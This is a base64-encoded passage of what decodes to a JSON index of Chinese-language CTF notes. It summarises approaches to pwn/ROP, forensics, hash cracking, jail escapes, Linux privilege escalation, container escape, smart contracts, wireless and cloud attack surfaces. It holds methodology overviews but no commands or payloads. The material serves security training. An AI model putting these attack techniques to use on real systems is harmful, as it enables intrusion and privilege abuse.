QkVEXV0gXHU0RTBFIFtbUHduLVx1NjgwOFx1NkVBMlx1NTFGQVx1NEUwRVJPUF1dXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiUHduLVx1NjgwOFx1NkVBMlx1NTFGQVx1NEUwRVJPUFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJQd24tXHU2ODA4XHU2RUEyXHU1MUZBXHU0RTBFUk9QXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU2ODA4XHU4RkQ5XHU2NzYxXHU3RUJGXHU3Njg0XHU1QjhDXHU2NTc0XHU2NUI5XHU2Q0Q1XHU4QkJBXHVGRjFBKipcdTUxNDhcdTc1MjggYGNoZWNrc2VjYCBcdThCRkJcdTUxRkFcdTk4OThcdTc2RUVcdTU4MzVcdTZCN0JcdTRFODZcdTU0RUFcdTY3NjFcdThERUZcdUZGMENcdTUxOERcdTUxQjNcdTVCOUFcdThENzAgcmV0MnRleHQgLyByZXQyc2hlbGxjb2RlIC8gcmV0MmxpYmMgLyByZXQyY3N1KipcdTMwMDJcdTY3MkNcdTdCQzdcdTUzRUFcdThCQjJcdTY4MDhcdTY1QjlcdTU0MTFcdUZGMDhcdTU4MDZcdTMwMDFcdTY4M0NcdTVGMEZcdTUzMTZcdTVCNTdcdTdCMjZcdTRFMzJcdTRFMEVcdTZDOTlcdTdCQjFcdTU0MDRcdTVGNTJcdTgxRUFcdTVERjFcdTc2ODRcdTdCMTRcdThCQjBcdUZGMDlcdUZGMENcdTRFM0JcdTdFQkZcdTY2MkZcXFwiXHU0RkREXHU2MkE0IFx1MjE5MiBcdThERUZcdTdFQkZcXFwiXHU3Njg0XHU1MUIzXHU3QjU2XHU5MDNCXHU4RjkxXHVGRjBDXHU0RTBEXHU2NjJGXHU4MENDIHBheWxvYWRcdTMwMDJcIlxuICAgICAgfVxuICAgICBdXG4gICAgfSxcbiAgICB7XG4gICAgIFwiaWRcIjogXCJtaXNjXCIsXG4gICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzlcIixcbiAgICAgXCJub3Rlc1wiOiBbXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU2NzQyXHU5ODc5LVx1NzhDMVx1NzZEOFx1NEUwRVx1NTE4NVx1NUI1OFx1NTNENlx1OEJDMVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzktXHU3OEMxXHU3NkQ4XHU0RTBFXHU1MTg1XHU1QjU4XHU1M0Q2XHU4QkMxXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU2MkZGXHU1MjMwXHU0RTAwXHU0RTJBXHU5NTVDXHU1MENGIC8gXHU0RTAwXHU1NzU3XHU1MTg1XHU1QjU4XHU4RjZDXHU1MEE4XHVGRjBDXHU1MTQ4XHU3ODZFXHU1QjlBXHUzMDBDXHU1QjgzXHU2NjJGXHU0RUMwXHU0RTQ4XHU1QkI5XHU1NjY4XHUzMDBEXHVGRjBDXHU1MThEXHU1MUIzXHU1QjlBXHU4RDcwXHUzMDBDXHU2NTg3XHU0RUY2XHU3Q0ZCXHU3RURGXHU2MDYyXHU1OTBEXHUzMDAxXHU5NkQ1XHU1M0Q2XHUzMDAxXHU4RkQ4XHU2NjJGXHU3NkY0XHU2M0E1XHU4QkZCXHU1MTg1XHU1QjU4XHUzMDBEXHUzMDAyXHU4QkVGXHU1MjI0XHU2NTg3XHU0RUY2XHU3Q0ZCXHU3RURGXHU2MjE2XHU1MjA2XHU1MzNBXHU4ODY4XHU2NjJGXHU4RkQ5XHU3QzdCXHU5ODk4XHU2NzAwXHU1OTI3XHU3Njg0XHU2NUY2XHU5NUY0XHU2RDZBXHU4RDM5XHU3MEI5XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU2NzQyXHU5ODc5LVx1NTNFM1x1NEVFNFx1NzgzNFx1ODlFM1x1NEUwRVx1NTRDOFx1NUUwQ1x1NzIwNlx1NzgzNFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzktXHU1M0UzXHU0RUU0XHU3ODM0XHU4OUUzXHU0RTBFXHU1NEM4XHU1RTBDXHU3MjA2XHU3ODM0XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU5ODk4XHU5MUNDXHU0RTIyXHU3RUQ5XHU0RjYwXHU0RTAwXHU0RTMyIDMyIFx1NEY0RFx1NTM0MVx1NTE2RFx1OEZEQlx1NTIzNlx1MzAwMVx1NEUwMFx1NEUyQSBgL2V0Yy9zaGFkb3dgXHUzMDAxXHU0RTAwXHU2QkI1IGAka3JiNXRncyRcdTIwMjZgXHVGRjBDXHU2MjE2XHU0RTAwXHU0RTJBXHU1MkEwXHU1QkM2XHU1MzhCXHU3RjI5XHU1MzA1XHVGRjBDXHU2M0E1XHU0RTBCXHU2NzY1XHU2MDBFXHU0RTQ4XHU1MjlFXHUzMDAyXHU2NzJDXHU5ODc1XHU3RUQ5XHUzMDBDKipcdTUxNDhcdTUyMjRcdTU0QzhcdTVFMENcdTdDN0JcdTU3OEIgXHUyMTkyIFx1NTE4RFx1OTAwOVx1NjUzQlx1NTFGQlx1NkEyMVx1NUYwRiBcdTIxOTIgXHU1MThEXHU1QjlBXHU1REU1XHU1MTc3XHU0RTBFXHU2QTIxXHU1RjBGXHU1M0Y3KipcdTMwMERcdTc2ODRcdTU2RkFcdTVCOUFcdTRFMDlcdTZCQjVcdTVGMEZcdTMwMDFcdTRFMDBcdTVGMjBcdTMwMENcdTc3MEJcdTUyMzBcdTRFQzBcdTRFNDggXHUyMUQyIFx1NzUyOFx1NTRFQVx1NEUyQVx1NjI0Qlx1NkNENVx1MzAwRFx1NzY4NFx1NTIyNFx1NjM2RVx1ODg2OFx1RkYwQ1x1NEVFNVx1NTNDQSBoYXNoY2F0IC8gam9obiAvIGh5ZHJhIFx1NTNFRlx1NzZGNFx1NjNBNVx1NTkwRFx1NTIzNlx1NzY4NFx1NTQ3RFx1NEVFNFx1OUFBOFx1NjdCNlx1MzAwMlx1ODQzRFx1NzBCOVx1NTcyOFx1OEJBNFx1OEJDMVx1N0M3Qlx1OTg5OFx1RkYxQVx1NjJGRlx1NTIzMFx1NTRDOFx1NUUwQ1x1NEU0Qlx1NTQwRVx1NzY4NFx1NjcwMFx1NTQwRVx1NEUwMFx1NkI2NVx1NUUzOFx1NjYyRlx1OEZEOVx1OTg3NVx1RkYwOFx1OEJGQiBzaGFkb3cgXHU3Njg0XHU1MjREXHU2M0QwXHU4OUMxIFtbXHU2NzQyXHU5ODc5LUxpbnV4XHU2NzJDXHU1NzMwXHU2M0QwXHU2NzQzXV1cdUZGMDlcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTY3NDJcdTk4NzktXHU1M0Q2XHU4QkMxXHU0RTBFXHU2RDQxXHU5MUNGXHU1MjA2XHU2NzkwXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1Njc0Mlx1OTg3OS1cdTUzRDZcdThCQzFcdTRFMEVcdTZENDFcdTkxQ0ZcdTUyMDZcdTY3OTBcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJNaXNjIFx1NzY4NFx1N0IyQ1x1NEU4Q1x1NTkyN1x1N0M3Qlx1RkYxQSoqXHU3RUQ5XHU0RjYwXHU0RTAwXHU0RUZEXFxcIlx1NzNCMFx1NTczQVxcXCJcdUZGMDhcdTZENDFcdTkxQ0ZcdTUzMDVcdTMwMDFcdTUxODVcdTVCNThcdTk1NUNcdTUwQ0ZcdTMwMDFcdTc4QzFcdTc2RDhcdTMwMDFcdTY1RTVcdTVGRDdcdUZGMDlcdUZGMENcdThGRDhcdTUzOUZcdTUzRDFcdTc1MUZcdTRFODZcdTRFQzBcdTRFNDhcdTMwMDFcdTYyOEEgZmxhZyBcdTYyN0VcdTUxRkFcdTY3NjVcdTMwMDIqKlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1Njc0Mlx1OTg3OS1cdTZDOTlcdTdCQjFcdTkwMDNcdTkwMzgtUHlKYWlsXHU0RTBFTm9kZUphaWxcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU2NzQyXHU5ODc5IFx1NkM5OVx1N0JCMVx1OTAwM1x1OTAzOFx1RkYxQVB5SmFpbCBcdTRFMEUgTm9kZUphaWxcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTdFRDlcdTRGNjBcdTRFMDBcdTZCQjVcdTUzRDdcdTk2NTBcdTc2ODRcdTRFRTNcdTc4MDFcdTYyNjdcdTg4NENcdTczQUZcdTU4ODNcdUZGMDhcdThGQzdcdTZFRTRcdTRFODZcdTUxNzNcdTk1MkVcdTVCNTcgLyBcdTc5ODFcdTRFODZcdTUxRkRcdTY1NzBcdUZGMDlcdUZGMENcdTYwRjNcdTUyOUVcdTZDRDVcdThERjNcdTUxRkFcdTk2NTBcdTUyMzZcdThCRkJcdTUyMzAgZmxhZ1x1MzAwMk1pc2MgXHU5MUNDXHU3Njg0XHU3RUNGXHU1MTc4XHU5NkJFXHU5ODk4XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU2NzQyXHU5ODc5LVx1NEZFMVx1NTNGN1x1NEUwRVx1Nzg2Q1x1NEVGNlx1NTNENlx1OEJDMVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzktXHU0RkUxXHU1M0Y3XHU0RTBFXHU3ODZDXHU0RUY2XHU1M0Q2XHU4QkMxXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RUNFXHU0RTAwXHU2QkI1XHU2Q0UyXHU1RjYyXHUzMDAxXHU0RTAwXHU1RTI3XHU4OUM2XHU5ODkxXHU2MjE2XHU0RTAwXHU0RTMyIFVTQiBcdTYyQTVcdTY1ODdcdTkxQ0NcdTYyOEFcdTk2OTBcdTg1Q0ZcdTRGRTFcdTYwNkZcdTYyQTBcdTUxRkFcdTY3NjVcdTMwMDJcdTY4MzhcdTVGQzNcdTUyQThcdTRGNUNcdTY2MkZcdTMwMENcdTUxNDhcdTUyMjRcdTdDN0JcdUZGMENcdTUxOERcdTkwMDlcdTg5RTNcdTc4MDFcdTU2NjhcdTMwMERcdTIwMTRcdTIwMTRcdTk3RjNcdTk4OTFcdTMwMDFSRi9TRFJcdTMwMDFcdTU5MTZcdThCQkUgUENBUFx1MzAwMTNEIFx1NjI1M1x1NTM3MFx1MzAwMVx1NTE0OVx1NzZEOFx1OTU1Q1x1NTBDRlx1NEU5NFx1NEUyQVx1NUI1MFx1OTVFRVx1OTg5OFx1NTQwNFx1NjcwOVx1NEUwMFx1NTk1N1x1RkYwQ1x1NTIyQlx1NzcwQlx1NjU4N1x1NEVGNlx1NTQwRFx1NTBDRlx1NUMzMVx1Nzg2Q1x1NTk1N1x1NTQwQ1x1NEUwMFx1NEUyQVx1ODExQVx1NjcyQ1x1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1Njc0Mlx1OTg3OS1cdTk2OTBcdTUxOTlcdTRFMEVcdTdGMTZcdTc4MDFcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU2NzQyXHU5ODc5LVx1OTY5MFx1NTE5OVx1NEUwRVx1N0YxNlx1NzgwMVwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIk1pc2MgXHU3Njg0XHU3QjJDXHU0RTAwXHU1OTI3XHU3QzdCXHVGRjFBKipcdTRGRTFcdTYwNkZcdTg1Q0ZcdTU3MjhcXFwiXHU3NzBCXHU4RDc3XHU2NzY1XHU2QjYzXHU1RTM4XHU3Njg0XHU0RTFDXHU4OTdGXFxcIlx1OTFDQyoqXHUzMDAyXHU2ODM4XHU1RkMzXHU4MEZEXHU1MjlCXHU2NjJGXHUyMDE0XHUyMDE0XHU2MkZGXHU1MjMwXHU0RTAwXHU0RTJBXHU2NTg3XHU0RUY2XHVGRjBDXHU1RkVCXHU5MDFGXHU5NUVFXHU1MUZBXFxcIlx1NUI4M1x1NjYyRlx1NzcxRlx1NzY4NFx1NTZGRVx1NzI0Ny9cdTk3RjNcdTk4OTFcdTU0MTdcdUZGMUZcdTU5MUFcdTUxRkFcdTY3NjVcdTc2ODRcdTkwRThcdTUyMDZcdTU3MjhcdTU0RUFcdUZGMUZcXFwiXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU2NzQyXHU5ODc5LVx1NkUzOFx1NjIwRlx1NEUwRVx1ODY1QVx1NjJERlx1NjczQVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzktXHU2RTM4XHU2MjBGXHU0RTBFXHU4NjVBXHU2MkRGXHU2NzNBXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiTWlzYyBcdTkxQ0NcXFwiXHU3NzBCXHU4RDc3XHU2NzY1XHU1MENGXHU2RTM4XHU2MjBGL1x1NTBDRlx1NEUwMFx1NTNGMFx1NjczQVx1NTY2OFxcXCJcdTc2ODRcdTRFMjRcdTdDN0JcdTk4OThcdUZGMUFcdTRFMDBcdTdDN0JcdTY2MkYqKlx1NEVBNFx1NEU5Mlx1NUYwRlx1NkUzOFx1NjIwRioqXHVGRjA4XHU4OTgxXHU4RDYyXHUzMDAxXHU4OTgxXHU2NzAwXHU0RjE4XHU3QjU2XHU3NTY1XHUzMDAxXHU2MjE2XHU1MzhCXHU2ODM5XHU0RTBEXHU4RDcwXHU2QjYzXHU4REVGXHVGRjA5XHVGRjBDXHU0RTAwXHU3QzdCXHU2NjJGKipcdTgxRUFcdTVCOUFcdTRFNDkgVk0vXHU1QjU3XHU4MjgyXHU3ODAxKipcdUZGMDhcdTUxNDhcdTUzQ0RcdTZDNDdcdTdGMTZcdTYyMTBcdTRGMkFcdTc4MDFcdTUxOERcdTg5RTNcdTk4OThcdUZGMDlcdTMwMDJcdThGRDlcdTk4NzVcdTUxNDhcdTY1NTlcdTUyMDZcdTdDN0JcdUZGMENcdTUxOERcdTdFRDlcdTUyMjRcdTYzNkVcdTU0OENcdTlBQThcdTY3QjZcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTY3NDJcdTk4NzktQmFzaEphaWxcdTRFMEVcdTUzRDdcdTk2NTBTaGVsbFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzktQmFzaEphaWxcdTRFMEVcdTUzRDdcdTk2NTBTaGVsbFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjI4QVx1NEUwMFx1NEUyQSBzaGVsbCBcdTUxNzNcdThGREJcdTdCM0NcdTVCNTBcdUZGMUFcdTYyMTZcdThGQzdcdTZFRTRcdThGOTNcdTUxNjVcdTVCNTdcdTdCMjZcdTMwMDFcdTYyMTZcdTUzRUFcdTc1NTlcdTRFMDBcdTY3NjEgYGV2YWxgIFx1N0YxRFx1MzAwMVx1NjIxNlx1NUU3Mlx1ODEwNlx1NTNFQVx1N0VEOVx1NEY2MCBydmltL2VkXHUzMDAyXHU4RkQ5XHU5ODc1XHU1NkRFXHU3QjU0XHU0RTA5XHU0RUY2XHU0RThCXHUyMDE0XHUyMDE0XHU3QjNDXHU1QjUwXHU5NTdGXHU0RUMwXHU0RTQ4XHU2ODM3XHUzMDAxXHU3NTI4XHU1NEVBXHU2NzYxXHU2MjRCXHU2Q0Q1XHU2NEFDXHUzMDAxXHU2NEFDXHU1RjAwXHU1NDBFXHU2MDBFXHU0RTQ4XHU4QkZCXHU4OEFCXHU3OTgxXHU3Njg0XHU2NTg3XHU0RUY2XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU2NzQyXHU5ODc5LUROU1x1NEUwRVx1N0Y1MVx1N0VEQ1x1NjAyQVx1OTg5OFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY3NDJcdTk4NzktRE5TXHU0RTBFXHU3RjUxXHU3RURDXHU2MDJBXHU5ODk4XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTI0XHU1NzU3XHU1MTg1XHU1QkI5XHVGRjFBXHU0RTAwXHU2NjJGKipcdTYyOEEgRE5TIFx1NUY1M1x1NEZFMVx1OTA1MyoqXHVGRjA4XHU5NkE3XHU5MDUzXHUzMDAxXHU1OTE2XHU1RTI2XHUzMDAxXHU5NjkwXHU4NTNEXHU0RjIwXHU4RjkzXHVGRjA5XHVGRjBDXHU0RThDXHU2NjJGKipcdTYyOEEgRE5TL1x1NTM0Rlx1OEJBRVx1NjcyQ1x1OEVBQlx1NzY4NFx1OEJFRFx1NEU0OVx1NUY1M1x1OTg5OCoqXHVGRjA4em9uZSB0cmFuc2Zlclx1MzAwMXJlYmluZGluZ1x1MzAwMVx1NjNFMVx1NjI0Qlx1NjAyQVx1NzY1Nlx1RkYwOVx1MzAwMlx1NjcyQlx1NUMzRVx1OTY0NCBDVEZkIFx1NUU3M1x1NTNGMFx1NzY4NFx1NjVFMFx1NkQ0Rlx1ODlDOFx1NTY2OFx1NUJGQ1x1ODIyQVx1MjAxNFx1MjAxNFx1NkJENFx1OEQ1Qlx1NEUyRFx1NEUwRFx1NzBCOVx1OUYyMFx1NjgwN1x1NEU1Rlx1ODBGRFx1NjdFNVx1OTg5OFx1MzAwMVx1NEUwQlx1OTY0NFx1NEVGNlx1MzAwMVx1NEVBNCBmbGFnXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU2NzQyXHU5ODc5LUxpbnV4XHU2NzJDXHU1NzMwXHU2M0QwXHU2NzQzXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1Njc0Mlx1OTg3OS1MaW51eFx1NjcyQ1x1NTczMFx1NjNEMFx1Njc0M1wiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NURGMlx1N0VDRlx1NjJGRlx1NTIzMFx1NEUwMFx1NEUyQVx1NjY2RVx1OTAxQVx1NzUyOFx1NjIzN1x1NzY4NCBzaGVsbFx1RkYwQ1x1NjAwRVx1NEU0OFx1NTNEOFx1NjIxMCByb290XHUzMDAyXHU4RkQ5XHU5ODc1XHU3RUQ5XHU0RTAwXHU1RjIwXFxcIioqXHU2MzA5XHU5ODdBXHU1RThGXHU2N0U1XHU0RUMwXHU0RTQ4KipcXFwiXHU3Njg0XHU2RTA1XHU1MzU1XHUzMDAxXHU0RTAwXHU1RjIwXFxcIioqXHU3NzBCXHU1MjMwXHU0RUMwXHU0RTQ4IFx1MjFEMiBcdTc1MjhcdTU0RUFcdTRFMkFcdTYyNEJcdTZDRDUqKlxcXCJcdTc2ODRcdTUyMjRcdTYzNkVcdTg4NjhcdUZGMENcdTRFRTVcdTUzQ0EgU1VJRCAvIHN1ZG8gLyBjcm9uIC8gZG9ja2VyIC8gY2FwYWJpbGl0aWVzIC8gQUNMIFx1NTE2RFx1Njc2MVx1NEUzQlx1N0VCRlx1NzY4NFx1NTNFRlx1OEREMVx1OUFBOFx1NjdCNlx1MzAwMlx1OTAwM1x1NTFGQSBiYXNoIGphaWwgXHU0RTRCXHU1NDBFXHU3Njg0XHU4NDNEXHU3MEI5XHU1RTM4XHU2NjJGXHU4RkQ5XHU5ODc1XHVGRjA4XHU4OUMxIFtbXHU2NzQyXHU5ODc5LUJhc2hKYWlsXHU0RTBFXHU1M0Q3XHU5NjUwU2hlbGxdXVx1RkYwOVx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1Njc0Mlx1OTg3OS1XaW5kb3dzXHU0RTBFTGludXhcdTRFM0JcdTY3M0FcdTUzRDZcdThCQzFcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU2NzQyXHU5ODc5LVdpbmRvd3NcdTRFMEVMaW51eFx1NEUzQlx1NjczQVx1NTNENlx1OEJDMVwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NEVDRVx1NEUwMFx1NTNGMFx1MzAwQ1x1NjJGN1x1NTFGQVx1Njc2NVx1NzY4NFx1NEUzQlx1NjczQVx1MzAwRFx1RkYwOFx1OTU1Q1x1NTBDRlx1MzAwMUtBUEUgXHU0RTA5XHU1M0Q2XHU4QkMxXHU1MzA1XHUzMDAxXHU2NUU1XHU1RkQ3XHU3NkVFXHU1RjU1XHVGRjA5XHU4RkQ4XHU1MzlGXHUzMDBDXHU4QzAxXHUzMDAxXHU0RUMwXHU0RTQ4XHU2NUY2XHU1MDE5XHUzMDAxXHU1MDVBXHU0RTg2XHU0RUMwXHU0RTQ4XHUzMDBEXHUzMDAyXHU2ODM4XHU1RkMzXHU2NjJGKipcdTU5MUFcdTY3NjVcdTZFOTBcdTRFQTRcdTUzQzlcdTlBOENcdThCQzEqKlx1RkYxQVx1NjUzQlx1NTFGQlx1ODAwNVx1ODBGRFx1NkUwNVx1NEU4Qlx1NEVGNlx1NjVFNVx1NUZEN1x1RkYwQ1x1NEY0Nlx1NkUwNVx1NEUwRFx1NjM4OSBVU04gXHU2NUU1XHU1RkQ3XHUzMDAxTUZUXHUzMDAxUHJlZmV0Y2hcdTMwMDFEZWZlbmRlciBcdTY1RTVcdTVGRDdcdTU0OENcdTZDRThcdTUxOENcdTg4NjhcdTY1RjZcdTk1RjRcdTYyMzNcdTMwMDJcIlxuICAgICAgfVxuICAgICBdXG4gICAgfSxcbiAgICB7XG4gICAgIFwiaWRcIjogXCJvdGhlclwiLFxuICAgICBcInRpdGxlXCI6IFwiXHU0RTkxIFx1MDBCNyBcdTVCQjlcdTU2NjggXHUwMEI3IFx1NTE3Nlx1NEVENlwiLFxuICAgICBcIm5vdGVzXCI6IFtcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTUzM0FcdTU3NTdcdTk0RkUtXHU2NjdBXHU4MEZEXHU1NDA4XHU3RUE2XHU1Qjg5XHU1MTY4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1NTMzQVx1NTc1N1x1OTRGRS1cdTY2N0FcdTgwRkRcdTU0MDhcdTdFQTZcdTVCODlcdTUxNjhcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJDVEYgXHU5MUNDXHU3Njg0XHU1MzNBXHU1NzU3XHU5NEZFL1x1NjY3QVx1ODBGRFx1NTQwOFx1N0VBNlx1OTg5OFx1NjAwRVx1NEU0OFx1NjI1M1x1RkYxQVx1OTg5OFx1NzZFRVx1N0VEOVx1NEUwMFx1NEVGRCBgLnNvbGAgXHU2RTkwXHU3ODAxXHU1MkEwXHU0RTAwXHU0RTJBIFJQQyBcdTgyODJcdTcwQjlcdUZGMENcdTc2RUVcdTY4MDdcdTkwMUFcdTVFMzhcdTY2MkZcdThCQTkgYGlzU29sdmVkKClgIFx1OEZENFx1NTZERSB0cnVlXHVGRjA4XHU2MjE2XHU2MjhBXHU1NDA4XHU3RUE2XHU0RjU5XHU5ODlEXHU2RTA1XHU5NkY2XHVGRjA5XHUzMDAyXHU2NzJDXHU5ODc1XHU3RUQ5XHU4OUUzXHU5ODk4XHU4MzAzXHU1RjBGXHUzMDAxXHU1MzQxXHU3QzdCXHU5QUQ4XHU5ODkxXHU2RjBGXHU2RDFFXHU3Njg0XHU1MzlGXHU3NDA2XHU0RTBFXHU0RUUzXHU3ODAxXHU5QUE4XHU2N0I2XHUzMDAxRVZNIFx1NUM0Mlx1ODAwM1x1NzBCOVx1RkYwQ1x1NEVFNVx1NTNDQVx1NjcyQ1x1NjczQVx1NzNBRlx1NTg4M1x1NEUwQlx1NzY4NFx1NURFNVx1NTE3N1x1OTRGRVx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1NUJCOVx1NTY2OFx1OTAwM1x1OTAzOFx1NjI4MFx1NjcyRlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTVCQjlcdTU2NjhcdTkwMDNcdTkwMzhcdTYyODBcdTY3MkZcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTVERjJcdTdFQ0ZcdTU3MjhcdTVCQjlcdTU2NjhcdTkxQ0NcdUZGMDhEb2NrZXIgLyBMWEMgLyBLOHMgUG9kXHVGRjA5XHVGRjBDXHU2MDBFXHU0RTQ4XHU2NDc4XHU1MjMwXHU1QkJGXHU0RTNCXHUzMDAyXHU2ODM4XHU1RkMzXHU0RTBEXHU2NjJGXFxcIlx1NEUwQVx1NTNCQlx1NUMzMVx1OEJENVx1NkYwRlx1NkQxRVxcXCJcdUZGMENcdTgwMENcdTY2MkZcdTUxNDhcdTdCNTRcdTRFMjRcdTk1RUVcdTIwMTRcdTIwMTQqKlx1NjIxMVx1NTcyOFx1NEVDMFx1NEU0OFx1NUJCOVx1NTY2OFx1OTFDQ1x1MzAwMVx1NjIxMVx1NjcwOVx1NEVDMFx1NEU0OFx1Njc0M1x1OTY1MCoqXHUyMDE0XHUyMDE0XHU1MThEXHU3MTY3XHU1MjI0XHU2MzZFXHU4ODY4XHU5MDA5XHU5NEZFXHUzMDAyXHU2NzJDXHU5ODc1XHU3QjJDXHU0RTAwXHU2NzYxXHU4OTgxXHU3ODM0XHU5NjY0XHU3Njg0XHU4QkVGXHU4OUUzXHVGRjFBKipcdTVCQjlcdTU2NjhcdTUxODUgcm9vdCBcdTIyNjAgXHU1QkJGXHU0RTNCIHJvb3QqKlx1RkYwOFx1ODlDMVx1N0IyQ1x1NTE2Qlx1ODI4Mlx1RkYwOVx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1NjVFMFx1N0VCRlx1NEUwRVx1NUMwNFx1OTg5MVx1NUI4OVx1NTE2OFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTY1RTBcdTdFQkZcdTRFMEVcdTVDMDRcdTk4OTFcdTVCODlcdTUxNjhcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTY1RTBcdTdFQkZcdTk4OThcdTUzRUFcdTY3MDlcdTU2REJcdTc5Q0RcXFwiXHU3M0IwXHU1NzNBXFxcIlx1RkYxQVx1NEUwMFx1NkJCNSBXaS1GaSBcdTYyOTNcdTUzMDVcdTMwMDFcdTRFMDBcdTZCQjVcdTg0RERcdTcyNTlcdTYyQTVcdTY1ODdcdTMwMDFcdTRFMDBcdTVGMjAgUkZJRCBcdTUzNjFcdTMwMDFcdTRFMDBcdTZCQjUgSVEvNDMzTSBcdTkxQzdcdTY4MzdcdTMwMDJcdTUxNDhcdTc1MjhcdTUyMjRcdTYzNkVcdTg4NjhcdThCQTRcdTczQjBcdTU3M0FcdUZGMENcdTUxOERcdTU5NTdcdTVCRjlcdTVFOTRcdTkwQTNcdTY3NjFcdTU2RkFcdTVCOUFcdTZENDFcdTZDMzRcdTdFQkZcdTIwMTRcdTIwMTRcdTdCNTRcdTY4NDhcdTU5MUFcdTY1NzBcdTU3MjhcXFwiKipcdTc5QkJcdTdFQkZcdTc4MzRcdTg5RTMqKlxcXCJcdTYyMTZcXFwiKipcdTkxQ0RcdTY1M0UqKlxcXCJcdTkxQ0NcdUZGMENcdTgwMENcdTRFMERcdTY2MkZcdTc3MUZcdTVCOUVcdTc4NkNcdTRFRjZcdTc2ODRcdTVCOUVcdTY1RjZcdTRFQTRcdTRFOTJcdTkxQ0NcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTc5RkJcdTUyQThcdTRFMEVJb1RcdTVCODlcdTUxNjhcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU3OUZCXHU1MkE4XHU0RTBFSW9UXHU1Qjg5XHU1MTY4XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTAwXHU1M0U1XHU4QkREXHU2NDU4XHU4OTgxXHVGRjFBQ1RGIFx1OTFDQ1xcXCJcdTc5RkJcdTUyQThcdTdBRUZcXFwiXHU1NDhDXFxcIklvVC9cdTc4NkNcdTRFRjZcXFwiXHU0RTI0XHU2NzYxXHU3RUJGXHU3Njg0XHU1QjhDXHU2NTc0XHU2MjUzXHU2Q0Q1XHUyMDE0XHUyMDE0QVBLL0lQQSBcdTRFQ0VcdTYyQzZcdTUzMDVcdTUyMzBcdTUyQThcdTYwMDEgaG9va1x1RkYwQ1x1NTZGQVx1NEVGNlx1NEVDRSBgYmlud2Fsa2AgXHU2MkM2XHU1MzA1XHU1MjMwXHU2QTIxXHU2MkRGXHU2MjY3XHU4ODRDXHU0RTBFXHU2M0E1XHU1M0UzXHU1QkExXHU4QkExXHVGRjBDXHU0RUU1XHU1M0NBXHU1QjgzXHU0RUVDXHU1MTcxXHU3NTI4XHU3Njg0XFxcIlx1NjI3RVx1NTFFRFx1NjM2RSBcdTIxOTIgXHU2MjdFXHU2M0E1XHU1M0UzIFx1MjE5MiBcdTYyN0VcdTUzNzFcdTk2NjlcdTZDNDdcdTgwNUFcdTcwQjlcXFwiXHU2NUI5XHU2Q0Q1XHU4QkJBXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU0RTkxXHU1Qjg5XHU1MTY4LVx1NUUzOFx1ODlDMVx1NjUzQlx1NTFGQlx1OTc2MlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTRFOTFcdTVCODlcdTUxNjg